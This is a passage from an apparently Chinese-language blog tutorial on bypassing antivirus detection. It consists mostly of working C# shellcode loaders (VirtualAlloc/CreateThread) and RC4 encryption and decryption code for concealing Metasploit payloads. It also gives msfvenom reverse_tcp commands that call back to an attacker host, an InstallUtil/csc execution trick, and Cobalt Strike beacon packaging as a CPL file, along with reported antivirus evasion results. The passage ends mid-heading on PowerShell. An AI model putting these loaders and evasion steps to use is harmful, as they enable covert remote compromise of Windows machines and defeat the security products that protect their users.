class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">VirtualFree</span>(<span class="params">IntPtr lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 dwSize, UInt32 dwFreeType</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">IntPtr param,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">ref</span> UInt32 lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">CloseHandle</span>(<span class="params">IntPtr handle</span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">IntPtr hHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">UInt32 dwMilliseconds</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetModuleHandle</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="built_in">string</span> moduleName</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetProcAddress</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">IntPtr hModule,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="built_in">string</span> procName</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">LoadLibrary</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="built_in">string</span> lpFileName</span></span></span><br><span class="line"><span class="params"><span class="function"></span>)</span>;</span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetLastError</span>()</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在vs2019中新建C#项目(选择控制台应用(.NET Framwork)),编译运行</p><p>msf开启监听，正常执行生成的exe。</p><h4 id="2-C-加密处理shellcode免杀"><a href="#2-C-加密处理shellcode免杀" class="headerlink" title="2.C#+加密处理shellcode免杀"></a>2.C#+加密处理shellcode免杀</h4><p>先用msf生成基于c#的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=3333 -f csharp -o payload.txt</span><br></pre></td></tr></table></figure><p>把上面<code>payload.txt</code>中的c#代码放入下面的加密代码中</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.CompilerServices;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Payload_Encrypt_Maker</span></span><br><span class="line">&#123; <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;  </span><br><span class="line">         <span class="comment">// 加密密钥，可以更改，加解密源码中保持KEY一致就行</span></span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] KEY = &#123; <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] IV = &#123; <span class="number">0x00</span>, <span class="number">0xcc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xcc</span> &#125;;</span><br><span class="line">        <span class="keyword">static</span> <span class="built_in">byte</span>[] payload =&#123;<span class="number">0x6b</span>,<span class="number">0xa9</span>&#125;;    <span class="comment">// 替换成MSF生成的shellcode</span></span><br><span class="line">      </span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Encryption_Class</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Encrypt</span>(<span class="params"><span class="built_in">string</span> key, <span class="built_in">string</span> data</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                Encoding unicode = Encoding.Unicode;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt</span>(<span class="params"><span class="built_in">byte</span>[] key, <span class="built_in">byte</span>[] data</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> EncryptOutput(key, data).ToArray();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">           </span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">EncryptInitalize</span>(<span class="params"><span class="built_in">byte</span>[] key</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] s = Enumerable.Range(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">                  .Select(i =&gt; (<span class="built_in">byte</span>)i)</span><br><span class="line">                  .ToArray();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    j = (j + key[i % key.Length] + s[i]) &amp; <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">                    Swap(s, i, j);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> IEnumerable&lt;<span class="built_in">byte</span>&gt; <span class="title">EncryptOutput</span>(<span class="params"><span class="built_in">byte</span>[] key, IEnumerable&lt;<span class="built_in">byte</span>&gt; data</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] s = EncryptInitalize(key);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">int</span> i = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">int</span> j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> data.Select((b) =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    i = (i + <span class="number">1</span>) &amp; <span class="number">255</span>;</span><br><span class="line">                    j = (j + s[i]) &amp; <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">                    Swap(s, i, j);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> (<span class="built_in">byte</span>)(b ^ s[(s[i] + s[j]) &amp; <span class="number">255</span>]);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Swap</span>(<span class="params"><span class="built_in">byte</span>[] s, <span class="built_in">int</span> i, <span class="built_in">int</span> j</span>)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span> c = s[i];</span><br><span class="line"></span><br><span class="line">                s[i] = s[j];</span><br><span class="line">                s[j] = c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] result = Encryption_Class.Encrypt(KEY, payload);</span><br><span class="line">            <span class="built_in">int</span> b = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; result.Length; i++)</span><br><span class="line">            &#123;   b++;</span><br><span class="line">                <span class="keyword">if</span> (i == result.Length+<span class="number">1</span>)</span><br><span class="line">                &#123;Console.Write(result[i].ToString());&#125;</span><br><span class="line">                <span class="keyword">if</span> (i != result.Length) &#123; Console.Write(result[i].ToString() + <span class="string">&quot;,&quot;</span>); &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译生成一段加密后的shellcode,要查看这段shellcode，直接到生成的exe目录下打开cmd，输入exe文件名即可查看。</p><p>在vs2017中再新建C#解密项目</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.CompilerServices;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">NativePayload_Reverse_tcp</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Shellcode.Exec();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Shellcode</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Exec</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> Payload_Encrypted;</span><br><span class="line">            Payload_Encrypted = <span class="string">&quot;0,244,36,163,code_herer&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span>[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(<span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">            <span class="built_in">byte</span>[] _X_to_Bytes = <span class="keyword">new</span> <span class="built_in">byte</span>[Payload_Encrypted_Without_delimiterChar.Length];</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span> current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());</span><br><span class="line">                _X_to_Bytes[i] = current;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 解密密钥，可以更改，加解密源码中保持KEY一致就行</span></span><br><span class="line">            <span class="built_in">byte</span>[] KEY = &#123; <span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">            <span class="built_in">byte</span>[] MsfPayload = Decrypt(KEY, _X_to_Bytes);</span><br><span class="line">            <span class="comment">// 加载shellcode</span></span><br><span class="line">            IntPtr returnAddr = VirtualAlloc((IntPtr)<span class="number">0</span>, (<span class="built_in">uint</span>)Math.Max(MsfPayload.Length, <span class="number">0x1000</span>), <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line">            Marshal.Copy(MsfPayload, <span class="number">0</span>, returnAddr, MsfPayload.Length);</span><br><span class="line">            CreateThread((IntPtr)<span class="number">0</span>, <span class="number">0</span>, returnAddr, (IntPtr)<span class="number">0</span>, <span class="number">0</span>, (IntPtr)<span class="number">0</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Decrypt</span>(<span class="params"><span class="built_in">byte</span>[] key, <span class="built_in">byte</span>[] data</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> EncryptOutput(key, data).ToArray();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">EncryptInitalize</span>(<span class="params"><span class="built_in">byte</span>[] key</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] s = Enumerable.Range(<span class="number">0</span>, <span class="number">256</span>)</span><br><span class="line">              .Select(i =&gt; (<span class="built_in">byte</span>)i)</span><br><span class="line">              .ToArray();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                j = (j + key[i % key.Length] + s[i]) &amp; <span class="number">255</span>;</span><br><span class="line">                Swap(s, i, j);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> IEnumerable&lt;<span class="built_in">byte</span>&gt; <span class="title">EncryptOutput</span>(<span class="params"><span class="built_in">byte</span>[] key, IEnumerable&lt;<span class="built_in">byte</span>&gt; data</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] s = EncryptInitalize(key);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">int</span> i = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">int</span> j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> data.Select((b) =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                i = (i + <span class="number">1</span>) &amp; <span class="number">255</span>;</span><br><span class="line">                j = (j + s[i]) &amp; <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">                Swap(s, i, j);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> (<span class="built_in">byte</span>)(b ^ s[(s[i] + s[j]) &amp; <span class="number">255</span>]);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Swap</span>(<span class="params"><span class="built_in">byte</span>[] s, <span class="built_in">int</span> i, <span class="built_in">int</span> j</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span> c = s[i];</span><br><span class="line"></span><br><span class="line">            s[i] = s[j];</span><br><span class="line">            s[j] = c;</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">IntPtr lpAddress, <span class="built_in">uint</span> dwSize, <span class="built_in">uint</span> flAllocationType, <span class="built_in">uint</span> flProtect</span>)</span>;</span><br><span class="line">        [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">IntPtr lpThreadAttributes, <span class="built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="built_in">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行生成的exe,msf正常上线</p><h4 id="3-XOR-AES编码shellcode"><a href="#3-XOR-AES编码shellcode" class="headerlink" title="3.XOR&#x2F;AES编码shellcode"></a>3.XOR&#x2F;AES编码shellcode</h4><p>先用msfvenom生成一个raw格式的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.43.30 lport=3333  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure><p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>se_null</code>为自己设置的key。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shellcode_encoder.py -cs shellcode.raw se_null xor</span><br></pre></td></tr></table></figure><p>生成的<code>encryptedShellcodeWrapper_xor.cs</code>文件中的C#源码放在vs2019中编译运行即可。</p><h3 id="2-加载器加载C-代码"><a href="#2-加载器加载C-代码" class="headerlink" title="2.加载器加载C#代码"></a>2.加载器加载C#代码</h3><h4 id="1-使用CSC-InstallUtil执行shellcode（VT-37-71-shell-exe不能过360）"><a href="#1-使用CSC-InstallUtil执行shellcode（VT-37-71-shell-exe不能过360）" class="headerlink" title="1.使用CSC+InstallUtil执行shellcode（VT:37&#x2F;71  shell.exe不能过360）"></a>1.使用CSC+InstallUtil执行shellcode（VT:37&#x2F;71  shell.exe不能过360）</h4><p>先通过msfvenom生成C＃的shellcode</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i <span class="number">6</span> -b <span class="string">&#x27;\x00&#x27;</span> lhost=<span class="number">192.168</span><span class="number">.43</span><span class="number">.30</span> lport=<span class="number">3333</span> -f csharp</span><br></pre></td></tr></table></figure><p>下载InstallUtil-Shellcode.cs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/InstallUtil-Shellcode.cs</span><br></pre></td></tr></table></figure><p>将上面生成的shellcode复制到<code>InstallUtil-Shellcode.cs</code>文件中。</p><p>使用csc(以下.NET版本不是唯一可以执行的)编译InstallUtil-ShellCode.cs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /platform:x86 /out:C:\test\shell.exe C:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure><p>编译生成的shell.exe直接执行是不行的，需要使用InstallUtil.exe来触发。</p><p>使用InstallUtil.exe执行shell.exe，360安全卫士会检测到InstallUtil.exe执行预警，360杀毒和火绒动态和静态均无预警。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\test\shell.exe</span><br></pre></td></tr></table></figure><h4 id="2-从资源里加载shelllcode"><a href="#2-从资源里加载shelllcode" class="headerlink" title="2.从资源里加载shelllcode"></a>2.从资源里加载shelllcode</h4><p>这里只介绍另外一种从资源里加载shelllcode的方法，不过很遗憾的是这个我没有复现成功。</p><p>参考自三好学生大佬的文章:<code>https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html</code></p><p>需要用到这个工具<code>https://github.com/rvrsh3ll/CPLResourceRunner</code></p><p>先用Cobalt Strike 生成shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attacks -&gt; Packages -&gt; Windows Executable (s) -&gt; Output =&gt; RAW (x86)</span><br></pre></td></tr></table></figure><p>然后用<code>ConvertShellcode.py</code>将生成的<code>beacon.bin</code>转换成<code>shellcode.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ConvertShellcode.py beacon.bin</span><br></pre></td></tr></table></figure><p>然后再转换成base64编码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode.txt |sed &#x27;s/[, ]//g; s/0x//g;&#x27; |tr -d &#x27;\n&#x27; |xxd -p -r |gzip -c |base64 &gt; b64shellcode.txt</span><br></pre></td></tr></table></figure><p>把生成的base64编码的shellcode复制到项目资源<code>CPLResourceRunner/Resources.txt</code>里。</p><p>编译生成dll，并将生成的<code>CPLResourceRunner.dll</code>重命名为<code>.cpl</code>文件，之后执行即可</p><p>不过经过测试，无法上线，没找出来具体原因。</p><p>msf生成spl木马</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp lhost=192.168.43.30 lport=3333  -f dll  &gt; shellcode.cpl</span><br></pre></td></tr></table></figure><p>执行：</p><p>(1) 双击直接运行</p><p>(2) cmd下输入<code>rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;</code></p><p>(3) cmd下输入<code>control &lt;文件名&gt;</code></p><h2 id="4-powershell"><a href="#4-powershell" class="headerlink" title="4.powershell"></a>4.powershell</h2><p><a href="https://mp.weixin.qq.com/s/Tw-FAduHMVzek_YxIErQDQ">https://mp.weixin.qq.com/s/Tw-FAduHMVzek_YxIErQDQ</a></p><h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h3><h4 id="1-powershell版本问题"><a href="#1-powershell版本问题" class="headerlink" 